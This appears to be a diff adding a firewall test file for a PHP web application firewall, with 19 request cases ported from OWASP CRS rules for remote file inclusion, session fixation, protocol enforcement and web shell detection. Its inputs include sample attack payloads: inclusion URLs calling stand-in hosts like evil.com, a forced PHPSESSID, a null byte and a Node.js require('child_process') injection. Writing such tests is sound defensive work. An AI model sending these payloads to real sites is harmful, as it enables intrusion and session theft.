@@ -1,0 +1,334 @@
+---
+# Test Rules ported from OWASP CRS 4.27.0 categories previously uncovered
+# RFI (CRS 931), Session Fixation (CRS 943), and Protocol Enforcement (CRS 920).
+# See rules.conf rule IDs 1101 1109. Cases needing raw HTTP (empty Accept
+# header, HTTP/1.0 protocol) live in 046-raw-http.yaml.
+meta:
+  author: "PHP WAF Team"
+  description: "CRS-ported rules: RFI, session fixation, protocol enforcement"
+  enabled: true
+  name: "045-crs-ported.yaml"
+
+tests:
+  #      Rule 1101 Remote File Inclusion (CRS 931)
+  - test_id: 1
+    test_title: "Block RFI: file= remote URL payload"
+    desc: "include-like param 'file' with http:// URL triggers rule 1101"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php?file=http://evil.com/shell.txt"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+        output:
+          status: 403
+
+  - test_id: 2
+    test_title: "Block RFI: page= https URL payload"
+    desc: "include-like param 'page' with https:// URL triggers rule 1101"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php?page=https://attacker.example.com/payload"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+        output:
+          status: 403
+
+  - test_id: 3
+    test_title: "Allow benign include-like param with non-URL value"
+    desc: "file=readme.txt must not trigger rule 1101"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php?file=readme.txt"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+        output:
+          status: 200
+
+  #      Rule 1102 Session Fixation (CRS 943)
+  - test_id: 4
+    test_title: "Block session fixation: PHPSESSID in query string"
+    desc: "PHPSESSID parameter in URL triggers rule 1102"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php?PHPSESSID=stolen123"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+        output:
+          status: 403
+
+  - test_id: 5
+    test_title: "Block session fixation: jsessionid in query string"
+    desc: "jsessionid parameter in URL triggers rule 1102"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php?jsessionid=abcDEF"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+        output:
+          status: 403
+
+  - test_id: 6
+    test_title: "Allow benign query parameter (not a session id)"
+    desc: "id=42 must not trigger rule 1102"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php?id=42"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+        output:
+          status: 200
+
+  #      Rule 1103 Host header is a numeric IP (CRS 920350)
+  - test_id: 7
+    test_title: "Block numeric IP Host header"
+    desc: "Host: 10.0.0.1 triggers rule 1103"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "10.0.0.1"
+            Accept: "*/*"
+        output:
+          status: 403
+
+  - test_id: 8
+    test_title: "Allow hostname Host header"
+    desc: "Host: localhost must not trigger rule 1103"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+        output:
+          status: 200
+
+  #      Rule 1106 GET or HEAD with body (CRS 920170)
+  - test_id: 9
+    test_title: "Block GET request with a body"
+    desc: "GET with Content-Length and body triggers rule 1106"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+            Content-Type: "application/x-www-form-urlencoded"
+            Content-Length: "7"
+          data: "q=hello"
+        output:
+          status: 403
+
+  #      Rule 1107 Null byte in URI (CRS 920270)
+  - test_id: 10
+    test_title: "Block null byte (%00) in URI"
+    desc: "%00 in request URI triggers rule 1107"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php%00"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+        output:
+          # HAProxy forwards the raw request target (literal "%00" text)
+          # as REQUEST_URI; rule 1107 matches %00. The WAF is the verifier.
+          status: 403
+
+  #      Rule 1108 Backup / working file access (CRS 920500)
+  - test_id: 11
+    test_title: "Block access to .bak backup file"
+    desc: "/index.php.bak triggers rule 1108"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php.bak"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+        output:
+          status: 403
+
+  - test_id: 12
+    test_title: "Block access to .old working file"
+    desc: "/config.old triggers rule 1108"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/config.old"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+        output:
+          status: 403
+
+  #      Rule 1110/1111 Web shell signatures in response (CRS 955)
+  - test_id: 13
+    test_title: "Block web shell banner in response body"
+    desc: "leak.php?type=webshell returns r57 shell title -> rule 1110"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/leak.php?type=webshell"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+        output:
+          status: 403
+
+  - test_id: 14
+    test_title: "Block web shell command UI in response body"
+    desc: "leak.php?type=webshell_cmd returns Ajax/PHP Command Shell -> rule 1111"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/leak.php?type=webshell_cmd"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+        output:
+          status: 403
+
+  #      Rule 1112 Directory listing in response (CRS 950130)
+  - test_id: 15
+    test_title: "Block directory listing in response body"
+    desc: "leak.php?type=dirlist returns Index of -> rule 1112"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/leak.php?type=dirlist"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+        output:
+          status: 403
+
+  #      Rule 1113 Source code leakage in response (CRS 950100)
+  - test_id: 16
+    test_title: "Block source code leakage in response body"
+    desc: "leak.php?type=srcleak returns <?php -> rule 1113"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/leak.php?type=srcleak"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+        output:
+          status: 403
+
+  - test_id: 17
+    test_title: "Allow clean leak.php response"
+    desc: "leak.php?type=clean must not trigger any response-body rule"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/leak.php?type=clean"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+        output:
+          status: 200
+
+  #      Rule 1114 Node.js injection in args (CRS 934)
+  - test_id: 18
+    test_title: "Block Node.js injection: require() in arg"
+    desc: "q=require('child_process') triggers rule 1114"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php?q=require(%27child_process%27)"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+        output:
+          status: 403
+
+  #      Rule 1115 Deprecated Content Transfer Encoding (CRS 922)
+  - test_id: 19
+    test_title: "Block deprecated Content-Transfer-Encoding header"
+    desc: "Content-Transfer-Encoding: base64 triggers rule 1115"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "POST"
+          uri: "/post.php"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+            Accept: "*/*"
+            Content-Type: "application/x-www-form-urlencoded"
+            Content-Transfer-Encoding: "base64"
+          data: "name=value"
+        output:
+          status: 403
